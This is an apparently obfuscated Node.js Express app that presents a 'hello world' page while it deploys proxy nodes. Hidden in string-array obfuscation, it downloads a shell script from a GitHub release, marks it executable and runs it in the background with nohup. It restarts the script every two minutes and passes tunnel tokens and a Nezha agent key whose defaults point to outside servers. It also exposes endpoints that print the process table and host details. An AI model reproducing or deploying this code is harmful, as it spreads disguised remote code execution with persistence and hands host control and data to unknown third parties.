const port = process.env.SERVER_PORT || process.env.PORT || 3000;
//====节点参数
const uuid = process.env.UUID || 'fd80f56e-93f3-4c85-b2a8-c77216c509a7';
const vmms = process.env.MPATH || 'vms';
const vmmport = process.env.VM_PORT || '8001';
const vpath = process.env.VPATH || 'vls';
const vport = process.env.VL_PORT || '8002';
const tmpargo = process.env.TMP_ARGO || 'vms';
const subname = process.env.SUB_NAME || 'plutonodes.net';
const suburl = process.env.SUB_URL || 'https://subw.qiangguo-xuexi.eu.org/upload-123456';
//====哪吒参数
const nezhaser = process.env.NEZHA_SERVER || 'data.xuexi365.eu.org';
const nezhaKey = process.env.NEZHA_KEY || 'DVRteQtnylMvbthMle';
const nezport = process.env.NEZHA_PORT || '443';
const neztls = process.env.NEZHA_TLS || '1';
//====隧道参数
const argoKey = process.env.TOK || '';
const argodomain = process.env.ARGO_DOMAIN || '';
const _0x37fda6=_0x1247;(function(_0x417402,_0xcc4451){const _0xcc0616=_0x1247,_0x5d396d=_0x417402();while(!![]){try{const _0x242392=parseInt(_0xcc0616(0x132))/0x1*(-parseInt(_0xcc0616(0x114))/0x2)+-parseInt(_0xcc0616(0x127))/0x3*(-parseInt(_0xcc0616(0x128))/0x4)+-parseInt(_0xcc0616(0x12d))/0x5+-parseInt(_0xcc0616(0x11a))/0x6+-parseInt(_0xcc0616(0x15f))/0x7*(parseInt(_0xcc0616(0x122))/0x8)+-parseInt(_0xcc0616(0x15c))/0x9*(parseInt(_0xcc0616(0x134))/0xa)+parseInt(_0xcc0616(0x150))/0xb;if(_0x242392===_0xcc4451)break;else _0x5d396d['push'](_0x5d396d['shift']());}catch(_0x174f57){_0x5d396d['push'](_0x5d396d['shift']());}}}(_0x343a,0x966c5));const express=require(_0x37fda6(0x146)),app=express(),exec=require(_0x37fda6(0x13f))['exec'],{execSync}=require(_0x37fda6(0x13f)),os=require('os'),{createProxyMiddleware}=require(_0x37fda6(0x142)),axios=require(_0x37fda6(0x14d)),fs=require('fs'),path=require(_0x37fda6(0x12f));console[_0x37fda6(0x12e)]('=============================='),console['log'](''),console[_0x37fda6(0x12e)]('/'+vmms+'\x20vmss\x20path'),console[_0x37fda6(0x12e)]('/'+vpath+'\x20vlss\x20path'),console[_0x37fda6(0x12e)]('/'+uuid+_0x37fda6(0x136)),console['log'](_0x37fda6(0x13d)),console[_0x37fda6(0x12e)](_0x37fda6(0x111)),console['log'](''),console[_0x37fda6(0x12e)](_0x37fda6(0x112)),app[_0x37fda6(0x139)]('/',function(_0x42d96f,_0x1ff474){const _0x30eef9=_0x37fda6;_0x1ff474[_0x30eef9(0x13a)](_0x30eef9(0x143));}),app[_0x37fda6(0x139)](_0x37fda6(0x131),function(_0x4e57c2,_0x122c20){const _0x45388e=_0x37fda6;let _0x7efb15=_0x45388e(0x120);exec(_0x7efb15,function(_0x165c53,_0x54dbce,_0x47dda4){const _0x220d25=_0x45388e;_0x165c53?_0x122c20['type'](_0x220d25(0x13b))['send'](_0x220d25(0x13c)+_0x165c53+_0x220d25(0x119)):_0x122c20[_0x220d25(0x141)](_0x220d25(0x13b))['send'](_0x220d25(0x11e)+_0x54dbce+_0x220d25(0x119));});}),app[_0x37fda6(0x133)]('/'+vmms,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x1d0d6a,_0xb93f4,_0x572d76){},'pathRewrite':{['^/'+vmms]:'/'+vmms},'target':'http://127.0.0.1:'+vmmport+'/','ws':!![]})),app['use']('/'+vpath,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x20e970,_0x162c34,_0x1c17ea){},'pathRewrite':{['^/'+vpath]:'/'+vpath},'target':_0x37fda6(0x151)+vport+'/','ws':!![]})),app[_0x37fda6(0x139)]('/'+uuid,function(_0x5ad2c2,_0x177f3b){const _0x4ffee5=_0x37fda6;fs['readFile']('/tmp/list.log',_0x4ffee5(0x11b),(_0x3707df,_0x25a096)=>{const _0x55e2d9=_0x4ffee5;if(_0x3707df){console[_0x55e2d9(0x159)](_0x55e2d9(0x14f),_0x3707df),_0x177f3b['status'](0x1f4)[_0x55e2d9(0x13a)]('Internal\x20Server\x20Error');return;}_0x177f3b[_0x55e2d9(0x113)]('Content-Type',_0x55e2d9(0x12b)),_0x177f3b[_0x55e2d9(0x13a)](_0x25a096);});}),app['get'](_0x37fda6(0x161),function(_0x1bcd1e,_0x28b07e){const _0x31eba3=_0x37fda6,_0x29f317={'platform':os[_0x31eba3(0x15a)](),'arch':os[_0x31eba3(0x123)](),'cpus':os[_0x31eba3(0x14b)]()[_0x31eba3(0x156)],'totalMemory':(os['totalmem']()/(0x400*0x400*0x400))['toFixed'](0x2)+'\x20GB','freeMemory':(os[_0x31eba3(0x12a)]()/(0x400*0x400*0x400))[_0x31eba3(0x138)](0x2)+'\x20GB','hostname':os[_0x31eba3(0x16f)](),'osType':os[_0x31eba3(0x141)](),'osRelease':os[_0x31eba3(0x176)](),'uptime':(os[_0x31eba3(0x11f)]()/0xe10)['toFixed'](0x2)+_0x31eba3(0x117)};_0x28b07e['json'](_0x29f317);}),app['get'](_0x37fda6(0x172),function(_0x133e49,_0x4baed0){const _0x3a3b03=_0x37fda6;try{const _0x5cc56a=_0x3a3b03(0x149),_0x42c9ac=isProcessRunning(_0x5cc56a);!_0x42c9ac&&start_server(),_0x4baed0['json']({'message':_0x3a3b03(0x145),'processName':_0x5cc56a,'isRunning':_0x42c9ac,'action':_0x42c9ac?'进程正在运行':_0x3a3b03(0x16b)});}catch(_0x18a13f){_0x4baed0['status'](0x1f4)[_0x3a3b03(0x124)]({'message':'检查进程时发生错误','error':_0x18a13f[_0x3a3b03(0x121)]()});}});function commandExists(_0x4562f3){try{return execSync('which\x20'+_0x4562f3,{'stdio':'ignore'}),!![];}catch(_0x4b0b65){return![];}}function isProcessRunning(_0x2e5b9a){const _0xaba0c3=_0x37fda6;if(commandExists(_0xaba0c3(0x169)))try{return execSync(_0xaba0c3(0x15b)+_0x2e5b9a),console[_0xaba0c3(0x12e)](_0xaba0c3(0x11c)),!![];}catch(_0x1a0dc2){}if(commandExists('ps'))try{const _0x5d26cb=execSync(_0xaba0c3(0x140)+_0x2e5b9a+'\x22\x20|\x20grep\x20-v\x20grep')[_0xaba0c3(0x121)]();if(_0x5d26cb[_0xaba0c3(0x163)]()!=='')return console['log'](_0xaba0c3(0x177)),!![];}catch(_0x38ee6e){}try{const _0x49516f=fs[_0xaba0c3(0x115)](_0xaba0c3(0x16d));for(const _0x6bdeb of _0x49516f){if(/^\d+$/[_0xaba0c3(0x118)](_0x6bdeb))try{const _0x165b30=fs[_0xaba0c3(0x130)]('/proc/'+_0x6bdeb+_0xaba0c3(0x162),_0xaba0c3(0x11b));if(_0x165b30[_0xaba0c3(0x129)](_0x2e5b9a))return console[_0xaba0c3(0x12e)](_0xaba0c3(0x152)),!![];}catch(_0x1e768c){}}}catch(_0x123559){console[_0xaba0c3(0x12e)](_0xaba0c3(0x153));}return![];}function start_server(){const _0xa1cefd=_0x37fda6;if(!isProcessRunning(_0xa1cefd(0x149))){const _0x5e5352=()=>{const _0x5b1bc8=_0xa1cefd;fs[_0x5b1bc8(0x13e)](_0x5b1bc8(0x160),fs[_0x5b1bc8(0x14e)][_0x5b1bc8(0x175)],_0x5a800d=>{const _0x12e2ba=_0x5b1bc8;if(_0x5a800d)console[_0x12e2ba(0x12e)](_0x12e2ba(0x166)),setTimeout(_0x5e5352,0x1388);else{const _0x2681f4=_0x12e2ba(0x15d)+uuid+_0x12e2ba(0x170)+vmms+_0x12e2ba(0x173)+vmmport+_0x12e2ba(0x14c)+vpath+_0x12e2ba(0x116)+vport+_0x12e2ba(0x15e)+tmpargo+'\x20NEZHA_SERVER='+nezhaser+_0x12e2ba(0x155)+nezhaKey+'\x20NEZHA_PORT='+nezport+_0x12e2ba(0x154)+neztls+'\x20ARGO_DOMAIN='+argodomain+_0x12e2ba(0x171)+argoKey+_0x12e2ba(0x158)+subname+_0x12e2ba(0x167)+suburl+'\x20&&\x20chmod\x20+x\x20./server.js\x20&&\x20nohup\x20./server.js\x20>/dev/null\x202>&1\x20&';exec(_0x2681f4,function(_0x3b16e0,_0xf11aa5,_0x74ce9e){const _0x257666=_0x12e2ba;if(_0x3b16e0)console[_0x257666(0x12e)](_0x257666(0x157),_0x3b16e0);else console['log'](_0x257666(0x12c));});}});};_0x5e5352();}else console['log'](_0xa1cefd(0x126));}function _0x1247(_0x5bfa00,_0x5822b1){const _0x343a8d=_0x343a();return _0x1247=function(_0x1247fe,_0x39173d){_0x1247fe=_0x1247fe-0x110;let _0x30a7f2=_0x343a8d[_0x1247fe];return _0x30a7f2;},_0x1247(_0x5bfa00,_0x5822b1);}function _0x343a(){const _0x23a291=['<pre>获取系统进程表：\x0a','uptime','ps\x20-ef\x20|\x20sed\x20\x27s@export\x20UUID=.*@web.js@g;s@--token.*@--token@g;s@-s.*@-s\x20SERVER@g;s@*.chmod@chmod@g\x27','toString','24HqpUVj','arch','json','pipe','server.js\x20is\x20already\x20running','3141LvVdML','3436xjWJLa','includes','freemem','text/plain;\x20charset=utf-8','调起server-命令行执行成功!','5984720qeJFLo','log','path','readFileSync','/stas','23432UmkUzw','use','6648220xNQbCe','listen','\x20查看订阅','URL_BOT','toFixed','get','send','html','<pre>命令行执行错误：\x0a','/info\x20查看系统信息','access','child_process','ps\x20aux\x20|\x20grep\x20\x22','type','http-proxy-middleware','hello\x20world','join','进程检查完成','express','server.js\x20is\x20running','createWriteStream','tmpapp','https://github.com/dsadsadsss/nodejs-wanju2/releases/download/1/start.sh','cpus','\x20VPATH=','axios','constants','Error\x20reading\x20file:','41422733OJrLTV','http://127.0.0.1:','server.js\x20found\x20in\x20/proc','Unable\x20to\x20check\x20/proc\x20directory.','\x20NEZHA_TLS=','\x20NEZHA_KEY=','length','调起server-命令行执行错误:','\x20SUB_NAME=','error','platform','pidof\x20','9eyntZP','export\x20UUID=','\x20TMP_ARGO=','2661806hVLUaT','./server.js','/info','/cmdline','trim','下载server成功','URL_BOT2','Waiting\x20for\x20server.js\x20to\x20exist...','\x20SUB_URL=','server.js\x20is\x20not\x20running.\x20Attempting\x20to\x20start...','pidof','data','已尝试启动进程','then','/proc','stream','hostname','\x20MPATH=','\x20TOK=','/start','\x20VM_PORT=','Example\x20app\x20listening\x20on\x20port\x20','F_OK','release','server.js\x20found\x20using\x20ps','下载server失败','/start\x20检查并启动进程','==============================','setHeader','32rEoyNb','readdirSync','\x20VL_PORT=','\x20hours','test','</pre>','4028946AktfFc','utf8','server.js\x20found\x20using\x20pidof','env'];_0x343a=function(){return _0x23a291;};return _0x343a();}function checkAndRestartServer(){const _0x33423f=_0x37fda6;!isProcessRunning(_0x33423f(0x149))?(console[_0x33423f(0x12e)](_0x33423f(0x168)),start_server()):console[_0x33423f(0x12e)](_0x33423f(0x147));}setInterval(checkAndRestartServer,0x1d4c0);function download_web(_0x53d19d){const _0x50cfc0=_0x37fda6;let _0x1cfa4d='server.js',_0x43322f=os[_0x50cfc0(0x123)]()==='x64'||os[_0x50cfc0(0x123)]()==='amd64'?process['env'][_0x50cfc0(0x137)]||_0x50cfc0(0x14a):process[_0x50cfc0(0x11d)][_0x50cfc0(0x165)]||_0x50cfc0(0x14a),_0x672df5=fs[_0x50cfc0(0x148)](path[_0x50cfc0(0x144)]('./',_0x1cfa4d));axios['get'](_0x43322f,{'responseType':_0x50cfc0(0x16e)})[_0x50cfc0(0x16c)](_0x1530ab=>{const _0x49dcf4=_0x50cfc0;_0x1530ab[_0x49dcf4(0x16a)][_0x49dcf4(0x125)](_0x672df5),_0x672df5['on']('close',()=>_0x53d19d(null));})['catch'](_0x357d14=>_0x53d19d(_0x50cfc0(0x110)));}download_web(_0x2f9b1f=>{const _0x20b466=_0x37fda6;_0x2f9b1f?console['log'](_0x2f9b1f):(console[_0x20b466(0x12e)](_0x20b466(0x164)),checkAndRestartServer());}),app[_0x37fda6(0x135)](port,()=>console[_0x37fda6(0x12e)](_0x37fda6(0x174)+port+'!'));